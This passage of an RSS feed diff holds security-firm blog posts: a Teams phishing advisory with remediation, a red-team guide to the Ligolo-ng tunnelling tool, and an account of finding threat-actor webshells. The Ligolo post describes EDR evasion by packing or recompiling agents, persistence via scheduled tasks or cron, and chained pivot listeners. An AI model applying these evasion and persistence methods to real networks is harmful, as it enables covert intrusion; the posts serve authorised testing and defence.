+&lt;h3&gt;Why is this a big deal?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;why-is-this-a-big-deal&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#why-is-this-a-big-deal&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The true reason I see this to be a potentially lucrative avenue for threat actors to deliver payloads is the fact that this bypasses nearly all modern anti-phishing security controls mentioned in the introduction of this advisory. &lt;/p&gt;
+&lt;p&gt;Firstly, it is very straightforward to buy a domain similar to your target organisations and register it with M365. It avoids the need to use mature domains, with web servers, landing pages, CAPTCHAs, domain categorisation, and URL filtering. This is a huge time saver, as this can cost several days or more on a red team engagement when setting up the various bits of infrastructure needed for a convincing phishing campaign. &lt;/p&gt;
+&lt;p&gt;Secondly, it avoids the now-rightfully-dangerous act of clicking on a link in an email, something that staff have been trained to avoid for years now, greatly reducing the likelihood of a typical staff member detecting this as a phishing attack. The payload will now be served by a trusted Sharepoint domain, and will arrive in the form of a file in a target’s Teams inbox. As such, the payload inherits the trust reputation of Sharepoint, not a malicious phishing website.&lt;/p&gt;
+&lt;p&gt;Finally, when this vulnerability is combined with social engineering via Teams it becomes very easy to start a back-and-forth conversation, jump on a call, share screens, and more. By comparison, it makes social engineering via email feel very stagnant, and stop-start. When using this on a real engagement the pretext of an IT technician was used to ask the target if they could jump on a call to update some critical software. Once on the call this vulnerability was leveraged to deliver a payload and, when combined with a full social engineering attack, was implicitly trusted by the target. &lt;/p&gt;
+&lt;h3&gt;Impact&lt;span class=&#34;absolute -mt-20&#34; id=&#34;impact&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#impact&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability affects every organisation using Teams in the default configuration. As such it has huge potential reach, and could be leveraged by threat actors to bypass many traditional payload delivery security controls. Having now proven this hypothesis, and used this vulnerability to successfully deliver malware that compromised a target machine in a client&amp;rsquo;s environment, I feel this has been successfully demonstrated as an exploitable finding.&lt;/p&gt;
+&lt;h3&gt;Remediation and Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;remediation-and-detection&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#remediation-and-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability was reported to Microsoft, who validated that the vulnerability is legitimate, but said that it ‘did not meet the bar for immediate servicing’. I think this is a shame, but was nonetheless expected. As such, JUMPSEC has added this section to help organisations who might be concerned about the above findings. &lt;/p&gt;
+&lt;p&gt;Firstly, I urge you to review if there is a business requirement for external tenants to have permission to message your staff in the first place. Of course, many businesses do legitimately require communication with other organisations, service providers, and more. That is not the case, however, for all businesses that use Teams. If you are not currently using Teams for regular communication with external tenants, tighten up your security controls and remove the option altogether. This can be done in Microsoft Teams Admin Center &amp;gt; External Access.&lt;/p&gt;
+&lt;p&gt;If you do require communication with external tenants, but there are only a handful of organisations that you regularly communicate with, then you can change the security settings to only allow communication with certain allow-listed domains. This would be a good middle ground for shutting down this attack path, without affecting your business operations. This can be done in Microsoft Teams Admin Center &amp;gt; External Access. &lt;/p&gt;
+&lt;p&gt;If either of the above will not work in your unique business case you have a few options. Firstly, endeavour to educate staff on the possibility of productivity apps such as Teams, Slack, Sharepoint, etc, for launching social engineering campaigns. It is not just email that is being abused any more, and yet it seems, in my personal opinion, that when using alternative avenues to email there is an inherent trust, due to the rich history connecting phishing and emails. &lt;/p&gt;
+&lt;p&gt;Regarding detections, there is currently limited support from Microsoft. Whilst there are plenty of Teams logs (see here for a full list &lt;a href=&#34;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&lt;/a&gt;) these do not currently cover the crucial ‘External Tenants Messaging your Staff’, or even better ‘Staff Member Accepts Message Request from External Tenant’. The latter would be preferable, as it would eliminate alerts from previously-known external tenants (your service providers, etc) and focus just on new message requests. I have reached out to Microsoft to attempt to turn on these logs so that they can be monitored in line with the increased usage of Teams for social engineering. If you agree that this should be made available, then please give the feature request a thumbs up (&lt;a href=&#34;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&lt;/a&gt;)&lt;/p&gt;
+&lt;p&gt;Whilst not a perfect solution, it would be possible to use web proxy logs to alert on, or more likely gain some baseline visibility into, staff members accepting external message requests. In EMEA, when a Teams user accepts a message request from an external tenant it sends a POST request to a unique URI which you can monitor:&lt;/p&gt;
+&lt;p&gt;/api/mt/emea/beta/userSettings/acceptlist/manage&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19675&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;947&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/request_clean.png&#34; title=&#34;request clean&#34; alt=&#34;request clean&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;request clean&lt;/figcaption&gt;
+  &lt;/figure&gt; URI for accepting external message requests[/caption]&lt;/p&gt;
+&lt;p&gt;The difficulty, at present, is turning this into a useful piece of telemetry with usernames, and the message in question. Monitoring this will, however, give you an idea of how common this transaction is in your estate, and allow you to potentially implement some of the mitigation factors mentioned above with a more educated understanding. &lt;/p&gt;
+&lt;h3&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As a Red Teamer regularly tasked with achieving an initial foothold in a target organisation, I have a unique appreciation and concern for the above-mentioned finding. With over 270 million active monthly users, Teams is incredibly common in target organisations. JUMPSEC’s Detection and Response Team (DART) have seen a trend towards novel phishing and payload delivery techniques leveraged in the wild, including but not limited to using Teams external tenancies for social engineering. With threat actors continually experimenting with new social engineering attacks, organisations are having to expand their security awareness to cover previously-overlooked frontiers.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Ligolo: Quality of Life on Red Team Engagements</title>
+      <link>//localhost:1313/articles/2023/06/2023-06-09-ligolo-quality-of-life-on-red-team-engagements/</link>
+      <pubDate>Fri, 09 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2023/06/2023-06-09-ligolo-quality-of-life-on-red-team-engagements/</guid>
+      <description>
+        
+        
+        &lt;p&gt;**&lt;figure&gt;
+    &lt;img src=&#34;images/ligolo-bugsbunny-2023-06-09_12-50-300x267.png&#34; title=&#34;ligolo bugsbunny 2023 06 09 12 50&#34; alt=&#34;ligolo bugsbunny 2023 06 09 12 50&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;ligolo bugsbunny 2023 06 09 12 50&lt;/figcaption&gt;
+  &lt;/figure&gt;**In recent months we, JUMPSEC’s red team, have been using a nifty little tool that we would like to share with you in this blog post. Ligolo-ng is a versatile tool that has been aiding our covert, and slightly-less-covert, engagements with regards to tunnelling, exfiltration, persistence, and widely improving the operators’ “quality of life” when carrying out assessments involving beaconing from within an internal network.&lt;/p&gt;
+&lt;p&gt;This highly-useful tool is developed by Nicolas Chatelain and can be found on Github at &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/nicocha30/ligolo-ng&lt;/a&gt;. Ligolo can be described as a modern tunnelling tool, similar to the likes of chisel, sshuttle or SSH, with the advantage of being written in GO and behaving just like a VPN. That is to say, when setup correctly operators can enjoy connections to a target network of up to 100 Mbits/sec, utilising various protocols such as ICMP (ping), UDP scans, SYN stealth scan, OS detection and DNS Resolution, which are commonly not allowed through proxychains or “standard” tunnelling tooling.&lt;/p&gt;
+&lt;p&gt;The tool uses agents on the compromised machine which connect to a publicly-facing proxy server to route traffic through a tun interface that is created on the host. In simple terms, Ligolo offers red teamers an alternative C2 channel that supports far more than traditional SSH or SOCKS proxies, allowing you to run a wider variety of tooling, much faster, and with what feels like too-good-to-be-true quality of life.&lt;/p&gt;
+&lt;p&gt;The gif below shows how quick it is to setup the proxy server on a linux host machine after downloading the proxy executable from the releases’ page on Github.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/latest_ligolo_demo_setup5.gif&#34; title=&#34;latest ligolo demo setup5&#34; alt=&#34;latest ligolo demo setup5&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;latest ligolo demo setup5&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;More and more, when using this tool, we discover features applicable to new use-cases. For example, beside its ease of use, things like using ping and private domain name resolution during a red team engagement are invaluable and can definitely improve the turnaround time and efficiency of an assessment. Once the necessary steps have been taken, as detailed below, operators can enjoy their entire suite of red team tooling on their linux server, with full name resolution, and speeds that are incomparable with that of traditional tunnelling on red team engagements. We have jokingly referred to Ligolo as allowing you to move your C2 into the target network!&lt;/p&gt;
+&lt;p&gt;Furthermore, it is possible to set up listeners on deployed agents to welcome connections coming from agents deployed somewhere else in the target environment. Crucially, the agents do not require any privileged permissions to be executed on the compromised hosts, because of its “gvisor” implementation, which works by virtualising sandboxed containers that translate traffic reaching the central proxy server deployed on our host.&lt;/p&gt;
+&lt;p&gt;As previously mentioned, GO makes it highly versatile and flexible, allowing operators to customise the proxy as well as the agents, and compile them to bypass defences or implement additional capabilities that are not there by default.&lt;/p&gt;
+&lt;p&gt;For example, we found ourselves able to bypass common endpoint detection and response (EDR) mechanisms employed in a Windows environment by simply either packing the agent executable (something like Nimcrypt will do), removing unimportant pieces of code, restructuring the source-code, or by compiling the agents beforehand and adding extra flags to the syntax, such as the following:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;GOOS=windows GOARCH=amd64 go build -ldflags=&amp;quot;-s -w&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Researchers at JUMPSEC have also recently determined that, in at least several mature client environments, the creation of new network interfaces is not monitored. Therefore, should you find yourself wanting to deploy a Ligolo proxy server on a compromised machine (remember you don’t need admin permissions to deploy an agent but you do need it to deploy a proxy server!), and that it does not appear that monitoring is in place for tunnelling tools such as Ligolo by default, which makes it an attractive target when compared to existing C2 payloads. A note of caution however, EDRs may flag the “tunnelling” functionality when traffic is exchanged between the agent and the proxy.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/fry-takemymoney-300x300.png&#34; title=&#34;fry takemymoney&#34; alt=&#34;fry takemymoney&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;fry takemymoney&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Once a successful connection has been established packets will be automatically (read automagically) routed to the intended target network, making it a seamless experience, and one that compares with the ease of which you would carry out operations in your own local network.&lt;/p&gt;
+&lt;p&gt;The agents can be easily modified and trivially executed by a Scheduled Task or a Cron Job for backdoor purposes or to establish persistence. When trying to achieve domain dominance on an engagement we found we were having to spend far less time in fixing or maintaining our foothold when compared to the usual routines of dealing with beacons, port forwarding and SSH tunnelling. Furthermore, we found that generally there are less restrictions in regards to the traffic we are allowed to generate and forward through.&lt;/p&gt;
+&lt;p&gt;As previously mentioned, another interesting capability of this tool is the possibility to create listeners on the agent themselves to chain connections as shown in the code block below.&lt;/p&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[Agent : domain\Administrator@VICTIM] &amp;gt;&amp;gt; listener_add --addr &amp;lt;agent_ip&amp;gt;:11601 --to &amp;lt;proxyserver_ip&amp;gt;:11601
+INFO[0326] Listener created on remote agent!&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;This behaviour is particularly useful when the proxy server’s IP address is out of reach for the last deployed agent, but connection can be established from the final pivoted box to the adjacent network running a previously deployed ligolo’s agent, allowing a pass-through connection back to our proxy server leveraged by the agent listener/forwarder.&lt;/p&gt;
+&lt;p&gt;Finally, some caveats to keep in consideration…Ligolo does not automatically recognise the subnets where traffic needs to be redirected to, therefore you will need to add your routes as you discover or need them, using something like “sudo ip route add 192.168.0.0/24 dev ligolo” on the proxy server’s host, and target’s nameservers to /etc/resolv.conf to use DNS instead of IP addresses in an internal network. Furthermore, do not expect your agents to automatically establish a tunnel when reconnecting to the proxy…an auto-connect feature needs to be developed in-house or wait for the feature to be released by the author. Finally, remember that when using it for client networks, you will need a publicly facing box reachable by the agents to listen for connections and execute commands from.&lt;/p&gt;
+&lt;p&gt;All in all, Ligolo enabled us to speed up our engagements, made our shells more stable and reliable, allowed for a larger and more comprehensive gathering of our targets data, and helped us spend less time maintaining an important part of our persistent operational infrastructure. Most importantly, it avoids the use of tooling on-disk or even in memory, as only the raw traffic leaves the compromised machine.&lt;/p&gt;
+&lt;p&gt;To conclude this blogpost, I just want to say (write) that we love Ligolo and we are very grateful to Nicolas Chatelain for creating this amazing instrument that we are proud to have in our day-to-day operational tool suite.&lt;/p&gt;
+&lt;p&gt;References&lt;/p&gt;
+&lt;p&gt;● The Cyber Plumber&amp;rsquo;s Handbook - &lt;a href=&#34;https://github.com/opsdisk/the&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/opsdisk/the&lt;/a&gt;_cyber_plumbers_handbook&lt;/p&gt;
+&lt;p&gt;● Ligolo-ng - &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/nicocha30/ligolo-ng&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;● Gvisor - &lt;a href=&#34;https://gvisor.dev/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gvisor.dev/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Alternatives to Ligolo-ng:&lt;/p&gt;
+&lt;p&gt;● Proxychains - &lt;a href=&#34;https://github.com/haad/proxychains&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/haad/proxychains&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;● Proxychains-ng - &lt;a href=&#34;https://github.com/rofl0r/proxychains-ng&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/rofl0r/proxychains-ng&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;● Chisel - &lt;a href=&#34;https://github.com/jpillora/chisel&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/jpillora/chisel&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;● SSHuttle - &lt;a href=&#34;https://github.com/sshuttle/sshuttle&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/sshuttle/sshuttle&lt;/a&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Butting Heads with a Threat Actor on an Engagement</title>
+      <link>//localhost:1313/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/</link>
+      <pubDate>Mon, 17 Apr 2023 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/</guid>
+      <description>
+        
+        
+        &lt;p&gt;At the time of writing I am enjoying some non-billable time in the wake of a demanding engagement spanning across several months. As such, I thought it would be a good time to write up a war story from a recent project in which we came head to head against genuine and active threat actors whilst on an engagement.&lt;/p&gt;
+&lt;p&gt;To set the scene, I am working on a purple team project in which we are to cover both the external and internal estate. This tale comes from the external portion of the engagement and as such my colleague and I are going about our usual external red team attack methodology. During this external phase we identify several instances of servers running a software that will remain unnamed for confidentiality’s sake. I will say that this was a third-party software that is used for Identity Access Management, and it appeared to be used in several environments (pre-prod, production, etc) within the client’s estate.&lt;/p&gt;
+&lt;p&gt;We fingerprint the exact version of the technology in-use and find that it is in fact vulnerable and outdated. Specifically, it is vulnerable to an unrestricted file upload vulnerability. As is so often the case, metasploit had created a module for the automated exploitation of this vulnerability - great news! As this is not a covert red team, and therefore getting detected is not an issue, I attempt to exploit the file upload vulnerability using meterpreter and msfvenom. Alas, the exploit fails. Undeterred, I look to manually verify the vulnerability myself as I so often find myself doing when metasploit fails me.&lt;/p&gt;
+&lt;p&gt;I find a proof-of-concept script on Github and read through the code. It looks good so I quickly write (steal) a JSP webshell to accompany the script and point the pair at my client’s vulnerable servers. This time, it works. With what feels like ‘too good to be true’ ease I’ve got remote code execution on the production Single Sign On (SSO) and Identity Access Management (IAM) server! As always in these cases I let the client know immediately before digging a little bit deeper.&lt;/p&gt;
+&lt;p&gt;When landing on an unknown machine I want to immediately perform some situational awareness. From an external perspective this may look slightly different to internal. Some of the main questions include: What OS/distribution am I using? What user and permissions do I have? Am I domain-joined? Do I have visibility into the internal network?&lt;/p&gt;
+&lt;p&gt;I quickly determine these answers and find that I am running as a low-privileged user, on a unix machine, that is not domain-joined. Not as juicy as I originally thought, but this is still the production SSO and IAM box so I am hopeful. At this point I get my first inclination that maybe such a trivial exploit chain may have already been abused. I run an &lt;em&gt;ls&lt;/em&gt; to look for the existence of other webshells beyond just my own.&lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19445&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;663&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/1.png&#34; title=&#34;Figure 1&#34; alt=&#34;Output of ’ls’ command&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;Figure 1&lt;/figcaption&gt;
+  &lt;/figure&gt; Output of &amp;rsquo;ls&amp;rsquo; command[/caption]&lt;/p&gt;
+&lt;p&gt;As you can see it appears that I am in the site root of the server. However, what I do not see is the name of my own webshell (cmd.jsp) meaning that my file must not have been uploaded to the site root, more likely it is in the webroot.&lt;/p&gt;
+&lt;p&gt;To find the location of the webroot I simply use my webshell to search for the location of my webshell file name to find where all files uploaded via this exploit would land on the file system. Sure enough, I found the appearance of my webshell in a folder that we will falsely call &lt;em&gt;/home/UserName/AppName/Authenticated.&lt;/em&gt; The natural next step is to list the contents of this directory as seen in the screenshot below.&lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19451&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;265&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/2-1.png&#34; title=&#34;Figure 2&#34; alt=&#34;2 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;Figure 2&lt;/figcaption&gt;
+  &lt;/figure&gt; Contents of Webroot[/caption]&lt;/p&gt;
+&lt;p&gt;Whilst this was useful, it was listing the files in alphabetical order which made it difficult to process which file could be a malicious JSP file versus one naturally used for webserver installation. I do another &lt;em&gt;ls&lt;/em&gt; command but this time listing the contents of the directory in descending order of date modified. That helps clear things up!&lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19452&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;556&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/3-1.png&#34; title=&#34;Figure 3&#34; alt=&#34;3 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;Figure 3&lt;/figcaption&gt;
+  &lt;/figure&gt; Contents sorted by Date Modified[/caption]&lt;/p&gt;
+&lt;p&gt;I immediately notice the large number of files that have the exact same last modified date and time on Feb 9th. My assumption is that Feb 9th was when the webserver was installed, as all the installation files share this modification date. This leaves 8 files that have been uploaded in the 21 days since installation. The top entry (cmd.jsp) is my webshell and can be excluded. Judging by the time stamps and similar file names this still leaves several unaccounted for JSP files. Naturally, I did a &lt;em&gt;cat&lt;/em&gt; on those files and sure enough…they were also webshells.&lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_19453&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;477&amp;rdquo;]&lt;figure&gt;
+    &lt;img src=&#34;images/4-1.png&#34; title=&#34;Figure 4&#34; alt=&#34;4 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;Figure 4&lt;/figcaption&gt;
+  &lt;/figure&gt; Threat Actor Webshells[/caption]&lt;/p&gt;
+&lt;p&gt;At this point I know we have stumbled upon something bad. I phone the client and let them know the news whilst I continue trying to attribute some of the webshells. Due to the fact that some of the files had very similar names and were uploaded consecutively I can safely assume that they belong to the same threat actor. When grouping as such, I arrive at the conclusion that there have been 4 threat actors who have exploited this in the last 5 days!&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/5-1.png&#34; title=&#34;5 1&#34; alt=&#34;5 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;5 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This is, of course, not counting any threat actors who had deleted their webshells when not in use like I had done. In the same vein, it is important to bear in mind that this was only one of several appearances of this vulnerable server in the estate.&lt;/p&gt;
+&lt;p&gt;I reach out to the client to ask permission to repeat the same process on the other vulnerable instances, but by this point the client has engaged their Managed Detection and Response (MDR) provider who has already begun the digital forensics work of identifying the extent of the damage,  whilst the client’s security team begin working on a patch. I write up a professional document containing all my findings, remediation steps, etc., and hand it over to both parties.&lt;/p&gt;
+&lt;p&gt;Later that evening I receive an email saying that the vulnerability has been patched and, thankfully, it appears it was caught before it became too much of an issue. However, the MDR provider did see attempts to jump from the external box to the internal network, and confirmed that the box had been enrolled in a crypto mining bot network to use its resources for crypto mining. All things considered this was a pretty good outcome after the initial shock of compromising such a sensitive system.&lt;/p&gt;
+&lt;p&gt;And with that quick turnaround my brief headbutt with a genuine and active threat actor(s) came to an end. It is not every day that you get findings like this but it lit the fire in me to get more exposure to the Incident Response side of things, and the client was happy we’d found and fixed a critical vulnerability in just a handful of hours. Wins all round!&lt;/p&gt;
+
+      </description>
+    </item>
+    
+  </channel>
+</rss>
